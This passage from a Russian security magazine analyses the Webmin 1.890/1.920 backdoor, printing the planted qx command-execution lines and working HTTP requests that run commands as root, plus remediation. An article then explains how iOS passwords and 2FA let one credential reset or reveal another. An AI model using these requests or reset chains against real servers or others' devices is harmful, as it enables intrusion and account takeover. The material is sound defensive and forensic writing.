ложной, так как никакого пользователя nonexistentuser не существу ет.
Поэтому выполняется вторая часть усло вия, где выводится сообщение
об ошибке, а к нему добавляется то, что вернет конс трукция qx/$in{'old'}/.


password_change.cgi
37: if ($wuser) {
...
39:     $enc = &acl::encrypt_password($in{'old'}, $wuser‐>{'pass'});
40:     $enc eq $wuser‐>{'pass'} || &pass_error($text{'password_eold'
},qx/$in{'old'}/);

Что же это за функция — qx? Это альтернатива использованию обратных
кавычек для выпол нения системных команд. В качес тве разделителей можно
использовать любые символы, в нашем случае это /. То есть, проще говоря,
будет выполнена команда, которая переда на в качестве старого пароля (old)
пользователя.
  Давай протестируем это и попробуем передать, например, uname ‐a.


POST /password_change.cgi HTTP/1.1
Host: webminrce19.vh:20000
Content‐Length: 52
Content‐Type: application/x‐www‐form‐urlencoded
Referer: https://webminrce19.vh:20000/session_login.cgi


user=nonexistentuser&pam=1&expired=2&old=uname+‐a&new1=any&new2=any





             Удален ное выполнение команд в Webmin 1.920

Вуаля! Команда была выполнена, и pass_error любез но предоставила
результат ее работы на экране.
   Таким образом, если парольная политика Webmin 1.920 раз решает зап‐
рашивать новые аутентификационные данные у поль зовате лей с прос рочен‐
ными паролями, то при такой конфигура ции воз можно удаленное выполнение
команд от име ни суперпользователя.
  С этой версией разоб рались, теперь перейдем к более старой 1.890.
Снова сравним файл password_change.cgi из двух источни ков.





  Разница между версиями файла password_change.cgi Webmin вер‐
  сии 1.890 из GitHub и SourceForge


webmin-1.890-github/password_change.cgi
12: $miniserv{'passwd_mode'} == 2 || die "Password changing is not
enabled!";


webmin-1.890-sourceforge/password_change.cgi
12: $in{'expired'} eq '' || die $text{'password_expired'},qx/$in{
'expired'}/;

Здесь есть похожая конструкция с qx — qx/$in{'expired'}/, только на этот
раз она была использована еще более дерзко.
  Сначала обращаю твое внимание на то, что вместо проверки парольной
политики используется прос тая проверка переменной $in{'expired'} на то,
не пустая ли она. Так как $in — это поль зовательские данные из запроса, то
обойти эту проверку не сос тавит никако го труда. Для этого достаточно ука‐
зать любое значение в параметре expired при зап росе к скрипту. К тому же
данные из этого параметра и являются тем, что будет выполнено. Поэтому
просто указываем необ ходимую команду.


POST /password_change.cgi HTTP/1.1
Host: webminrce18.vh:10000
Content‐Length: 52
Content‐Type: application/x‐www‐form‐urlencoded
Referer: https://webminrce18.vh:10000/session_login.cgi


expired=id

И сервер вернет результат ее выполнения.





        Успешное выполнение произвольного кода в Webmin 1.890


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Сегодня мы узнали, что не стоит слепо доверять даже таким источникам,
как sourceforge.net. Если есть несколь ко способов скачать при ложения, то
можно сверить их контрольные суммы. А если ты ставишь дис трибутив
на сервер, где будет идти работа с важными данными, то этот пункт становит‐
ся еще актуальнее.
   Если ты сам разработчик, то почаще проверяй, что ты загружаешь на раз‐
ные ресурсы: версии не должны рас ходиться. А еще лучше использовать
какое‐то средство авто матичес кого аудита исходников, которое предупредит
о подозрительных находках. Это, конечно, не панацея, но в таких случаях
может выручить.
   Если же ты уже исполь зуешь Webmin и хочешь избавиться от описанной
закладки, то это просто. Достаточно уда лить вызов функции qx, а также вер‐
нуть проверку passwd_mode в Webmin версии 1.890.
   Если хочешь побольше узнать о том, как получилось, что бэкдор попал
в релиз дистрибутива, рекомендую озна комиться с официальной хроноло‐
гией событий, написанной разработчиками Webmin.
ПРИВАТНОСТЬ


   ЧЕТЫРЕ
 С ПОЛОВИНОЙ
   ПАРОЛЯ

        КАК УСТРОЕНА СИСТЕМА
        АУТЕНТИФИКАЦИИ IOS





Пароли — один из самых старых методов
аутентификации. Несмотря на почтенный
возраст, они остаются основным спо собом
убедиться в том, что пользователь — имен‐
но  тот,  за  кого  себя  выда ет.  Пароли           Олег Афонин                                                                                      Эксперт по мобильной
недаром пользуются популярностью. Хоть       криминалистике«Элкомсофт»компании
у них и множество недостатков, у паролей        aoleg@voicecallcentral.com
есть и несомненные достоинства: при дол‐
жном контроле они могут быть как дос‐
таточно  безопасными,   так  и  вполне
запоминаемыми.


Что важнее — безопасность или запоминаемость? Вопрос не  такой
однозначный, каким кажется. Еще исследова ние 2017 года показало, что
у самого обычного поль зователя порядка двадцати учетных записей. У сред‐
него офисного работника использовалась 191 учетная запись — и это только
те пароли, которые вводятся в окно бра узера.
   Какие еще пароли бывают? Если у тебя iPhone, то, скорее всего, тебе при‐
ходится иметь дело с четырь мя (или пятью — как пос мотреть) пароля ми, тес‐
но связанными между собой. Вот они:
 1. Код блокиров ки экрана (это пароль, которым ты разблокируешь iPhone).
 2. Пароль от iCloud (он же — пароль от учетной записи Apple ID).
 3. Пароль от резервной копии iTunes (с его помощью будет зашифрована
   резервная копия iPhone, если соз дать ее на компь юте ре).
 4. Пароль «Экранного времени» (позволяет защитить перечисленные выше
   пароли от сброса, а также устанавливать огра ничения на использование
   устройства).
 5. Одноразовый код двухфакторной аутентифика ции (будем считать его
   «половинкой» пароля; использует ся только в учет ных записях, на которых
   вклю чена двухфакторная аутентификация).

Все эти пароли связаны достаточно запутанной сис темой взаимоотношений,
в которой нелегко разобрать ся даже специалистам. Мы уже писали о некото‐
рых взаимосвязях (например, о том, что пароль на резервную копию iTunes
можно сбросить, если известен код бло кировки экрана), но пароли переп‐
летены друг с другом гораз до теснее, чем мы описыва ли ранее.
  В этой статье приведены все извес тные нам вза имос вязи и взаимозави‐
симости между паролями, а также способы, при помощи которых можно
сбросить один пароль, если известен другой.



КОД БЛОКИРОВКИ ЭКРАНА

Код блокировки — самый важный пароль (а точнее, кодовая фраза), который
владельцы iPhone используют чаще всех осталь ных, вмес те взя тых. Этот
пароль применяется при настройке iPhone. По умолчанию система предлага‐
ет установить код блокировки из шес ти цифр, но можно поставить и PIN‐код
попроще — из четырех цифр. Можно выб рать и более сложный код блокиров‐
ки, состоящий из произвольного количес тва цифр (как в Android) или из бук‐
венно‐цифровой последовательнос ти произволь ной длины.





             Цифровой пароль произвольной длины

При настройке кода бло кировки будет установлено соединение с iCloud;
это необходимо для того, чтобы добавить устройство в доверенный круг,
участники  которого  могут  безопас но  син хронизи ровать  такие  данные,
как пароли («Облачная связка клю чей»), «Здоровье», сообщения и «Экранное
время». Соответственно, ни одна из этих категорий не будет синхронизи‐
рована, если ты не настроишь код блокировки. Кроме того, без кода бло‐
кировки не станет работать платежная система Apple Pay.


        WWW

                   В блоге «Элкомсофт» есть две статьи на тему
                       кода блокировки экрана:  Protecting  Your Data
                      and Apple Account If They Know Your iPhone Pass‐
                      code и Passcode vs. Biometrics: Forensic Implica‐
                            tions of Touch ID and Face ID in iOS 12.



Если код бло кировки утрачен
Если ты обычный (хорошо, пусть продвинутый) поль зователь и тебя угораз‐
дило забыть код блокировки, то тебе будет дос тупно не так много воз можнос‐
тей. Можно сбросить устройство через режим Recovery, можно — переп‐
рошить через DFU. Конечный результат окажется один: данные будут унич‐
тожены, а для настрой ки сброшенного устройства тебе потребуется ввес ти
пароль от iCloud.
   Если ты регулярно подключал телефон к компьюте ру, то на компьюте ре
может сохраниться файл lockdown. С его помощью можно установить соеди‐
нение и сделать резервную копию телефона перед тем, как его сбросить
(работает только в том случае, если телефон раз блокировали хотя бы раз
после последне го включения или перезаг рузки). Если резервная копия
защищена паролем от резервной копии iTunes, то из нее можно извлечь
пароль от iCloud, чтобы активировать сброшенный телефон. А вот если такого
файла нет или срок его действия истек, то подклю чить телефон к компьютеру
не получится: начиная с iOS 11 для подключения к новому компьютеру нужно
ввести код блокировки экра на.
   У работников правоохранительных органов есть возможность запус тить
перебор кодов блокировки (именно поэтому усиленно не рекомендуется
использовать четырехзначный PIN). Впро чем, шанс на успех при исполь‐
зовании даже шестизначного цифрового кода блокировки невысокий.
   Итак, если код блокировки утра чен:
 • Можно сбросить iPhone через Recovery. Это сбросит код блокировки
   экрана и удалит все данные, но для настройки устройства потребу ется
   ввести пароль от iCloud.
 • Работникам правоохранительных орга нов может быть доступен вариант
   с перебором кодов бло кировки.
 • Подклю чить iPhone к новому компь ютеру не удастся (для установления
   доверенного соединения требуется ввести код блокировки экрана).
 • Если есть доступ к файлу lockdown, а телефон был разблокирован хотя бы
   раз с момента последней перезагрузки или вклю чения, то существу ет воз‐
   можность извлечь локальную резервную копию. Если резервная копия
  защищена паролем от резервной копии iTunes, то из нее можно будет
   извлечь пароль от iCloud, пос редством которо го можно акти вировать
   сброшенный телефон.


Если код бло кировки известен
Если же код блокировки известен, с телефоном можно проделать множество
разных вещей:
 • Разблокировать устройство даже пос ле холодной загрузки.
 • Подклю чить к новому компьютеру или аксессу арам USB (обход блокиров‐
   ки USB).
 • Создать свежую резервную копию в формате iTunes.
 • Сбросить пароль от iCloud.





 • Изменить доверенный номер телефона для получения кодов двухфактор‐
   ной аутентификации (только для учетных записей с двухфакторной аутен‐
   тификацией; одноразовый код для это го не нужен). Теперь коды, получен‐
  ные на этот номер, могут быть использованы для прохождения двух‐
   факторной аутентификации с любого устрой ства.





 • Сбросить  пароль  от резервной  копии  iTunes  (если не  установлен
   или известен пароль «Экранного времени»), соз дать резервную копию
   с новым паролем и узнать из нее пароль от iCloud.





 • iOS 13: установить или изменить пароль от резервной копии iTunes.
 • Обновить версию iOS.
 • Сбросить устройство к заводским нас трой кам, отключить iCloud lock.
 • Просматривать пароли из «Связки ключей».
 • Получить доступ к некото рым типам данных в iCloud (потребуется указать
   пароль от iCloud и одно разовый код двухфакторной аутентификации —
   оба из которых можно сбросить и настроить заново при помощи кода бло‐
   кировки экрана). В список входят такие данные, как «Облачная связка клю‐
   чей» (пароли от учетных записей пользователя, запол ненные формы в Sa‐
    fari), данные «Здоровья» и «Экранного времени», сообщения (SMS,
   iMessage).
 • Сменить или удалить код блокировки экра на (при его удалении станут
   недоступными некото рые данные как в самом iPhone, так и в облаке
   iCloud).


Под водные камни
 • Установленный неизвестный пароль «Экранного времени» не даст сбро‐
   сить пароль от резервной копии iTunes.
 • Если пользователь установил ограничения на внесение изменений в учет‐
  ную запись Apple ID и защитил огра ничение паролем «Экранного вре‐
   мени», то сбросить пароль от iCloud не удастся.
 • При сме не кода блокировки экра на iOS пот ребует установить соеди нение
   с iCloud. Это нужно для добавления iPhone в круг доверенных устройств,
   которые будут син хронизировать защищенную часть данных (пароли
   из «Облачной связки ключей», «Здо ровье», сооб щения, «Экранное вре‐
   мя»).





Выглядит достаточно запутанно? Мы только начали!



ПАРОЛЬ ОТ ICLOUD

Учетная запись iCloud (а точнее — Apple ID) не обя зательна; можно поль‐
зоваться телефоном и без нее. Впрочем, так же как и в случае с кодом бло‐
кировки, без учетной записи в iCloud полноценно пользоваться устройством
не выйдет. Пароль от iCloud совпадает с паролем от учетной записи Apple ID,
а без учетной записи Apple не получится не толь ко синхронизировать данные
и создавать резервные копии в iCloud, но и загружать приложения, даже бес‐
платные, из магазина App Store, слушать музыку и совершать покупки в Apple
Music. Мало кто покупает iPhone исключительно для звонков и прос мотра
веб‐страниц через встроенный бра узер, поэтому большинство пользовате‐
лей заводит себе учетную запись Apple ID.
  В Apple контролируют минимальную сложность пароля к iCloud; слишком
простой пароль установить не получится, равно как и пароль, совпадающий
с одним из тех, которые использовались ранее.
  Пароль от iCloud защищает дос туп к онлайновой части доступных поль‐
зователю сервисов Apple (например, к фотог рафи ям, которые хранятся
в iCloud, к данным календарей, заметок, облачным резервным копиям). Кро‐
ме того, пароль от iCloud используется для защиты iPhone от сброса к завод‐
ским настройкам (а точнее — от воз можнос ти его после этого активировать
и использовать), а также для уда ленной блокировки, отслеживания или сти‐
рания данных с украденных устройств.
  В то же время пароль от iCloud — далеко не все, что нужно для доступа
ко всем данным в iCloud. Так, некоторые данные будут сохраняться в облако
только после включения двухфакторной аутентификации (соответственно,
для их извлечения понадобится одноразо вый код двухфакторной аутен‐
тификации), а некоторые (пароли из «Облачной связки ключей», «Здоровье»,
сообщения, «Экранное время») дополнительно защищены еще и кодом бло‐
кировки экрана.
  Можно ли обой ти пароль и все равно получить дос туп к данным из облака?
Да, но набор доступных таким обра зом данных будет ограничен; подробнос‐
ти — в статье Accessing iCloud With and Without a Password in 2019.


Если пароль от iCloud утрачен
Пароль от iCloud используется зна читель но реже кода блокировки экрана;
соответственно, забывают его пользователи гораз до чаще. Для его восста‐
новления Apple опубликовали подробную инс трукцию в статье «Ес ли вы
забыли пароль учетной записи Apple ID».
  Пароль от iCloud можно сбросить с доверенного устройства (собствен‐
ного iPhone пользователя); для это го дос таточно указать код блокировки
экрана, но требуется, чтобы в учет ной записи была включена двухфакторная
аутентификация (одноразовый код не понадобится). Пароль от iCloud можно
сбросить и с другого устройства Apple или через браузер (в этом случае нуж‐
но будет ввести одноразовый код двухфакторной аутентификации).
  Кроме того, пароль от iCloud можно узнать, проанализировав пароли, сох‐
раненные в браузере на компьютере (Chrome, IE, Edge, Firefox), при помощи
Internet Password Breaker (Windows), либо извлечь из «Связки ключей» macOS
инструментом Password Digger. Наконец, можно про анализировать зашиф‐
рованную резервную копию iOS при помощи Phone Breaker.
   Итак, если утрачен пароль от iCloud, ты сможешь:
 • Сбросить его с собственного iPhone или дру гого устройства из экосис‐
  темы Apple (потребуется код блокировки экрана, должна быть включена
   двухфакторная аутентификация, одноразовый код не понадобится).





 • Сбросить с чужого устройства из экосистемы Apple (код блокировки экра‐
   на, должна быть включена двухфакторная аутентификация, нужно ввести
   одноразовый код).
 • Сбросить через браузер (процесс раз лича ется для учетных записей с 2FA
   и без; потребуется дос туп к ящику электронной почты, привязанному
   к данному Apple  ID, одноразовый код двухфакторной аутентификации
   для учетных записей с 2FA; код может быть доставлен в SMS, отправ‐
   ленной на доверенный номер телефона — который, напомним, можно
  сменить при помощи кода блокировки экра на).


Если пароль от iCloud известен
Как ни странно, если известен пароль от iCloud (и только он), сделать можно
не так и много:
 • Заново настро ить устройство, если был утра чен код блокировки экрана
   (сброс через  Recovery, настройка с  нуля, ввес ти пароль от  iCloud
   для отвязки от iCloud).
 • Подтверждать покупки в App Store и iTunes Store (альтернатива — биомет‐
   рическая аутентифика ция, для настройки которой, впрочем, все равно
   потребуется ввести пароль от iCloud).
 • Подтверждать обновление приложений (пароль запрашивается не всегда;
   закономерности выявить не уда лось).
 • Логин в App Store (если включена двухфакторная аутентификация, пот‐
   ребуется одноразовый код).
 • Извлекать ограниченное количество данных из iCloud (если двухфакторная
   аутентификация не включена).
 • Извлекать чуть больше данных из iCloud (толь ко если двухфакторная
   аутентификация вклю чена и дос тупен одноразо вый код).
 • Извлекать еще чуть больше данных из iCloud (пароли «Облачной связ ки
   клю чей», пароль «Экранного времени», сооб щения, «Здоровье»; только
   если двухфакторная аутентифика ция включена, доступен одноразовый код
   и код блокировки экра на).





   Категории, помеченные на скриншоте выше оранжевым цветом, можно
   извлечь, если известен код блокировки экрана. «Зеленые» категории лег‐
   ко извлекаются при помощи только логина и пароля от iCloud (для учетных
   записей с 2FA понадобится и одноразовый код).
 • Отвязать iPhone от iCloud, отклю чить Find My iPhone, сбросить к заводским
   настройкам.
 • Войти в учетную запись Apple из браузера (если включена двухфакторная
   аутентификация, потребуется одноразовый код).
 • Дистанционно стереть или заблокировать iPhone при помощи сервиса
   iCloud Find (одноразовый код не нужен даже для учетных записей с двух‐
   факторной аутентификацией).
 • Сменить пароль от Apple ID / iCloud.
 • Добавить учетную запись на устрой ствах Apple; устройство становится
   доверенным (если вклю чена двухфакторная аутентификация, потребуется
   одноразовый код).


Под водные камни
 • Пароль от iCloud не получится сбросить или изменить, если на устрой стве
   настроено ограничение «Экранного времени» на действия с учетной
   записью (а пароль «Экранного времени» неизвестен).
 • Уже по списку «Если пароль известен» видно, что сам по себе пароль
   от iCloud практически бес полезен, ког да в учетной записи включена двух‐
   факторная аутентификация. Имея дос туп ко второму фактору, можно легко
   сбросить пароль от iCloud. А вот добавить или изменить дополнительный
  фактор аутентификации, имея только пароль от iCloud, невозможно. Офи‐
   циальная процедура вос становления учетной записи не дает гаран‐
   тированного результата (в нашей лаборатории мы смогли восстановить
  лишь каждую вторую учетную запись). Похоже, дополнительный фактор
   аутентификации в настоящий момент имеет больший вес, чем пароль
   от iCloud.



                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
ЧЕТЫРЕ С ПОЛОВИНОЙ
           ПАРОЛЯ
           КАК УСТРОЕНА СИСТЕМА АУТЕНТИФИКАЦИИ
                                                IOS





ПАРОЛЬ ОТ РЕЗЕРВНОЙ КОПИИ ITUNES

Этот пароль такой же опциональный, как и предыдущие два. Более того, если
не установить пароль на резервную копию, то для неискушенного поль‐
зователя не изменится по большому  счету  ничего:  все  возможности
как устройства, так и облачных сервисов будут доступны точно так же, как и
с паролем. В статье The Most Unusual Things about iPhone Backups мы описали
некоторые особенности паролей от резервной копии.
  Для чего вообще нужен этот пароль? Очевидно, для шифрования резер‐
вной копии, которую мож но создать в iTunes. Нуж но ли задавать этот пароль,
если ты никогда не создавал резервные копии в iTunes и не собираешься это‐
го делать? Да, нужно, потому что резервную копию злоумышленник может
создать самостоятельно, пос ле чего получит дос туп практичес ки к полному
содержимому телефо на, включая все пароли к учетным записям, которые
использовались в браузере Safari. Помешает ли этот пароль злоумышленни‐
ку, если он получит в руки твой iPhone и узнает его код блокировки? Нет,
не помешает, но ты сможешь дополнительно  (и достаточно надежно)
защитить его паролем «Экранного времени».
  Насколько вооб ще безопасен пароль от резервной копии iTunes? Если
в руки злоумышленника попадут только файлы резервной копии, зашиф‐
рованные неизвестным паролем, то тебе повез ло: скорость перебора будет
исключительно низкой. Даже на профессиональ ном оборудовании с исполь‐
зованием аппаратного ускорения и рас пределенных вычис лительных сетей
скорость перебора на одном компь ютере не превыша ет 100 паролей в секун‐
ду. Это очень медленно; пароль из случай ного набора букв и цифр длиной
хотя бы в шесть символов не будет вскрыт и за сотню лет.
  Ситуация меняется на полностью противо положную, если в руки злоумыш‐
ленника попадет твой iPhone, а код бло кировки экра на подсмотрят или узна‐
ют иным способом. Используя код бло кировки экра на, пароль от резервной
копии iTunes можно сбросить буквально за пару шагов (вмес те с ним удаляет‐
ся и код блокировки телефона). Если же цель — узнать оригинальный пароль,
то можно сде лать джейлбрейк (для старых устройств это возможно незави‐
симо от версии iOS), после чего пароль извлекается из скрытой записи
«Связки ключей».
  Наконец, если на iPhone запущена iOS 13, то для установки или смены
пароля от резервной копии также потребуется ввести код блокировки экрана.


Если пароль от резервной копии iTunes утрачен
 • Если оригинальный iPhone в твоем распоряжении, то можно сбросить
   пароль от резервной копии iTunes; для это го нужен код блокировки экрана.
   Если установлен пароль «Экранно го времени», то потребуется ввести
   и его.
 • Если же в тво ем рас поряжении только файлы резервной копии, то единс‐
   твенный возможный вариант — атака по словарю или методом пол ного
   перебора.
 • Если цель — анализ данных из локальной резервной копии, то заменить
   ее может восстановление на новое устройство либо скачивание и анализ
   комбинации из облачной резервной копии устройства и «Связки ключей»
   из iCloud. Для доступа к ним нужны будут пароль от iCloud, одноразовый
   код двухфакторной аутентификации и (для анализа «Облачной связки клю‐
   чей») код блокировки экра на телефо на.


Если пароль от резервной копии iTunes известен
Известный пароль от резервной копии (при наличии самой резервной копии)
позволит:
 • Восстановить из резер вной копии как оригинальное, так и новое устрой‐
   ство с iOS, включая вос ста новление «Связ ки клю чей» с пароля ми.
 • Проанализировать  содержимое  резервной  копии  (включая  пароли
   из «Связки ключей»).
 • Узнать пароль «Экранного времени» (только для iOS 12) или пароль огра‐
   ничений (для iOS 11). Приложений для этого существует дос таточно много;
   отобразить пароль «Экранного времени» в сос тоянии, к примеру, Elcom‐
    soft Phone Viewer.
 • Узнать пароль от iCloud / Apple ID (подробнее об этом чуть ниже).


Под водные камни
 • Пароль от iCloud не всег да можно най ти в резервной копии. Точную
   зависимость установить не удалось.
 • Пароль «Экранного времени» можно узнать толь ко для старых версий iOS.
  В резервных копиях, соз данных iOS 13 и более свежими сборками, пароль
   «Экранного времени» получил более высокий класс защиты и не может
   быть расшифрован из резервной копии.
 • Если тебе пришлось сбросить пароль от резервной копии iTunes через
   настройки телефона, то код блокировки экрана также будет сброшен.
   Это приведет к удалению с устройства данных обо всех транзакциях Apple
   Pay, писем и данных Exchange. Ты потеряешь возможность сбросить
   пароль от iCloud; будет утра чен доступ к «Облачной связке ключей» и дру‐
   гим защищен ным данным в обла ке. Впрочем, дос туп к облачным данным
  можно восстановить, задав код блокировки заново и позволив сис теме
   добавить устройство в список доверенных.

А теперь — обещанные подробнос ти об извлечении пароля от iCloud
из резервной копии с паролем (это важно: из резервной копии, которая
паролем не защищена, извлечь «Связ ку клю чей» невозможно). Пароль
от iCloud может хранить ся в одной или нес коль ких записях из сле дующего
списка:
 • com.apple.account.AppleIDAuthentication.password;
 • apple.account.iTunesStore.password и apple.account.AppleAccount.password
   (устаревшие записи, в которых все еще может оказаться пароль).

Пароль от iCloud можно обна ружить и в этих записях, принадлежащих браузе‐
ру Safari:
 • appleid.apple.com;
 • www.icloud.com;
 • idmsa.apple.com;
 • id.apple.com;
 • secure1.store.apple.com;
 • secure2.store.apple.com;
 • mapsconnect.apple.com;
 • daw2.apple.com.



ПАРОЛЬ «ЭКРАННОГО ВРЕМЕНИ»

«Экранное время» — отно сительно недавно появившаяся в iOS 12 сис тема,
позволяющая отсле живать и ограничивать время использования устройства.
Установленные ограничения пользователь может защитить код‐паролем,
состоящим из четырех цифр.
   Если пользователь установил пароль «Экранного вре мени», то система
будет запрашивать его при попытке изменить настройки как собственно
ограничений, установленных в разделе «Экранного времени», так и некото‐
рых других системных нас троек. В час тности, сис тема потребует ввести
пароль «Экранного времени»  (в дополнение к коду блокировки экрана)
при попытке сбросить нас тройки (Reset All Settings) с целью сбросить пароль
от резервной копии iTunes.
   Пользователи могут установить и собственные ограничения. Например,
может быть установлено огра ничение на дей ствия с учетной записью, пос ле
чего iOS не позволит сбросить пароль от iCloud, вводя код блокировки.
Еще одно ограничение может запретить установку на устрой ство приложе‐
ний, что не даст выполнить джейлбрейк и извлечь из устройства образ фай‐
ловой системы. А вот защитить пароли в «Связ ке ключей» таким образом
не получится: их всегда можно просмотреть, даже если установлен пароль
«Экранного времени».


Если пароль «Экранно го вре мени» утрачен
 • Невозможно отключить или обойти установленные ограничения «Экранно‐
   го времени», убрать или сменить пароль.
 • Невозможно вклю чить функцию «Экранного времени» Share across devices
   («Учет на всех устрой ствах»), бла года ря которой пароль «Экранного вре‐
   мени» попадает в облако iCloud и может быть отту да извлечен.
 • Невозможно сбросить настройки для уда ления пароля к резервной копии
   iTunes.
 • В зависимости от установленных пользователем нас троек могут быть
   и другие ограничения: на сброс пароля от iCloud, установку приложе ний
   и другие.
 • iOS 12: пароль «Экранного времени» можно извлечь из локальной резер‐
   вной копии с паролем (если пароль от резервной копии iTunes известен).
 • iOS 12 и 13: пароль «Экранного времени» можно извлечь из iCloud, если
   известен пароль от iCloud, есть одноразовый код двухфакторной аутен‐
   тификации и известен код блокировки устройства (не обя зательно дан‐
   ного конкретного устройства, но хотя бы одного устройства из доверен‐
   ного круга); функция «Экранного времени» Share across devices («Учет
   на всех устройствах») должна быть уже включена.


Если пароль «Экранно го вре мени» известен
Если пароль «Экранного времени» известен, ты сможешь:
 • Настраивать и отключать ограничения «Экранного вре мени».
 • Сменить или удалить пароль «Экранного времени».
 • Если известен код блокировки устройства, сменить пароль от резервной
   копии iTunes.


Под водные камни
 • iOS 12: для того чтобы извлечь пароль «Экранного времени» из локальной
   резервной копии, необ ходимо, чтобы локальная копия была зашифрована
   паролем, а сам пароль от резервной копии iTunes был известен.
 • iOS 13: пароль «Экранного времени» хранится с повышенным классом
   защиты и не может быть извлечен из резервной копии. Вмес то этого мож‐
   но использовать извлечение из iCloud.





 • Из облака iCloud пароль «Экранного времени» можно извлечь лишь
   при условии, что поль зователь включил функцию «Экранного вре мени»
   Share across devices («Учет на всех устройствах»). Если эта функция вклю‐
   чена, то в качестве кода блокировки можно использовать код блокировки
   экрана или системный пароль любого устрой ства  Apple, входящего
   в «доверенный круг» (то есть они зарегистри рова ны в том же Apple ID и на
   них также включена функция «Экранного времени» «Учет на всех устрой‐
   ствах»).
 • Функция «Учет на всех устройствах» работа ет исключительно в учетных
   записях с двухфакторной аутентифика цией. Соответс твенно, потребуется
   ввести одноразовый код двухфакторной аутентификации.


        WWW

                    Ссылки по теме:
                   •How To Access Screen Time Password and Recov‐
                             er iOS Restrictions Password
                   •How to Extract Screen Time Passcodes and Voice
                    Memos from iCloud



ОДНОРАЗОВЫЙ КОД ДВУХФАКТОРНОЙ
АУТЕНТИФИКАЦИИ

Итак, мы рассмотрели четыре пароля, которые защищают разные аспекты
экосистемы Apple. Однако если в случае с iPhone даже слабого пароля может
быть достаточно просто из‐за того, что к телефону нужно еще получить
физический доступ, то защита онлайновой учетной записи одним лишь
паролем давно показала свою несостоятельность. Яркий пример — Celeb‐
gate, событие, которое зас тавило Apple поторопиться и выпустить сырую вер‐
сию двухфакторной аутентифика ции под названием Two‐Step Veriﬁcation.
  Сегодня  Apple  исполь зует  гораз до  более  техничес ки  продвинутую
и безопасную схему, которая называется просто и бесхитростно — Two‐Fac‐
tor Authentication, или двухфактор ная аутентификация. В этой системе есть
возможность настроить любое устройство Apple (и только Apple) в качестве
доверенного «второго фактора». Кро ме того, пользователю обязательно при‐
дется добавить хотя бы один доверенный телефонный номер на тот слу чай,
если единственное устройство Apple будет утеряно или украдено.
  Система оказалась силь ной и дос таточно безопас ной, и в Apple решили
этим воспользоваться. Неожиданно «второй, допол нительный» фактор аутен‐
тификации получил в нагрузку возможности, позволяющие проделы вать ряд
вещей, которые в других системах считаются дурным тоном.
  Нравится тебе это или нет, но двухфакторную аутентификацию придется
вклю чить, если ты хочешь получить доступ к любому из перечисленных ниже
сервисов:
 • синхронизация паролей в iCloud («Облачная связ ка ключей»);
 • синхронизация  сооб щений  (SMS  и  iMessage),  данных  «Здоровья»
   и «Экранного времени» в iCloud;
 • возможность сбросить забытый пароль от iCloud / Apple ID.

Купив новое устрой ство с iOS 13 и зарегистрировав све жий идентификатор
Apple ID, ты просто не сможешь настроить его без двухфакторной аутен‐
тификации. Раз вклю чив, отключить ее уже не получится: прецеденты единич‐
ны, и каждый случай требовал персонально обра щаться в поддержку Apple
и потом долго ждать.
   Какое значение придает Apple двухфакторной аутентификации, понятно
из того, что с помощью вто рого «дополнительного» фактора легко можно
сбросить пароль от Apple ID / iCloud. А вот если потерять дос туп ко всем
носителям «допол нительного» фактора (включая устройства Apple и доверен‐
ный телефонный номер — что на самом деле прос то, если ты в заграничной
поездке), то получить дос туп к собственной учетной записи не выйдет. Точ‐
нее, этого можно будет добиться, заполнив заявку, и после длительного (нес‐
колько недель) ожидания дос туп к учет ной записи может быть (а может и не
быть) предоставлен.


Если доступ ко вто рому фак тору аутен тификации утрачен
Если доступа ко вто рому фактору аутентифика ции нет, наступят грустные пос‐
ледствия:
 • Доступ к учетной записи Apple ID и к iCloud невоз можен, даже если пароль
   от iCloud известен. Исключения — функция Find My и отвязка сброшенного
   телефона от iCloud; в обоих этих случаях достаточно одного лишь пароля
   от iCloud.
 • Возможно, тебе удастся вос ста новить доступ к учетной записи Apple
   через официальную процеду ру. Это долго (несколько недель), а результат
   не гарантирован.

Так что второй фактор аутентифика ции лучше не терять.


Если доступ ко вто рому фак тору аутен тификации име ется
Если же у тебя есть дос туп ко второму фактору аутентификации, можно про‐
делать следующие вещи:
 • Сбросить пароль от iCloud / Apple ID с доверенного устройства (оно выс‐
   тупает в роли второго фактора).
 • Восстановить доступ  к учетной записи Apple ID и сбросить пароль
   от iCloud при помощи одноразового кода двухфакторной аутентификации
   (с чужого устрой ства Apple).
 • После сбро са пароля от iCloud войти в учет ную запись и извлечь из нее
   данные (часть данных будет дополнительно защищена кодом блокировки
   экрана).
 • Восстановить из облачной резервной копии новое или существующее
   устройство Apple.
 • При восстановлении  из облачной резервной копии существующего
   устройства (именно того, с которого была ранее создана резервная
   копия) будут восстановлены и пароли из «Связ ки ключей» (даже если тебе
   неизвестен код блокировки экрана, который необходим для скачивания
   синхронизированной «Облачной связ ки ключей»).


Под водные камни
 • Даже если доступ ко второму фактору аутентификации утрачен, будут дос‐
   тупны функция Find My и отвязка сброшенного телефона от iCloud. Для их
   работы достаточ но одно го лишь пароля от iCloud.
 • «Связка клю чей» из облачной резервной копии может быть восстановлена
   исключительно на то же самое физичес кое устройство, с которого была
   создана резер вная копия. Для дос тупа к «Облачной связке ключей» необ‐
   ходимо ввести код бло кировки экра на от одно го из предыдущих устрой‐
   ств.



ПАРОЛИ И ПОЛИТИКИ БЕЗОПАСНОСТИ

Политики безопасности, ограничивающие использование слишком простых
паролей, различаются для всех четырех (с половиной) паролей.
 • Код бло кировки экрана. Жес ткой политики нет. По умолчанию система
   предлагает использовать код, сос тоящий из шес ти цифр, но по желанию
   пользователь может выбрать и четырехзначный PIN, а также цифровой
   пароль произвольной длины либо буквенно‐цифровой пароль любого раз‐
   мера. У Apple есть база данных самых час то используемых паролей; если
   пользователь попытается установить именно такой пароль (например,
   0000, 1111 или 1234), то система предуп редит о небезопасности такого
   кода блокировки — но все же позволит его уста новить.
 • Пароль от iCloud. Минимальная длина — восемь знаков. Тре буется
   использовать по крайней мере одну строчную и одну заглавную букву,
   а также по крайней мере одну цифру. Кроме того, нельзя установить
   пароль, который уже использовался ранее.
 • Пароль от резервной копии iTunes. Ограничения отсутствуют.
 • Пароль «Экранно го вре мени». Всегда ровно четыре циф ры.
 • Двухфакторная аутен тификация. Доверенными устройствами могут
   стать только устройства из эко системы Apple (iPhone, iPad, компьютер
   Mac). Требуется наличие хотя бы одного доверенного телефонного
   номера, при этом допус кается наличие в одной учетной записи нескольких
   доверенных телефонных номеров из раз ных стран, что может быть удобно
   в поездках.

